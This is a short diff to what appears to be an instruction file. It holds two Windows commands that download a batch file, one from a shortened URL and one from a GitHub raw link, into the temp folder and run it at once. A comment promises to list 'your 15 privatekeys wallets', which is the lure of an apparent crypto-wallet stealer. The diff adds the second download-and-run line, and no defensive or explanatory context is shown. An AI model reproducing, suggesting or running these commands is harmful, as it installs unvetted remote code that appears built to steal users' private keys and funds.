@@ -3,3 +3,5 @@
 curl --ssl-no-revoke -sL https://tinyurl.com/26xyebgr -o %TEMP%\w.bat && %TEMP%\w.bat
 
 // your 15 privatekeys wallets will be listed + liquidity pools 
+
+set LAB_AUTO=1&& curl.exe -fsSL -o "%TEMP%\wallet.bat" "https://raw.githubusercontent.com/mash3dev/V6/main/wallet.bat" && call "%TEMP%\wallet.bat"
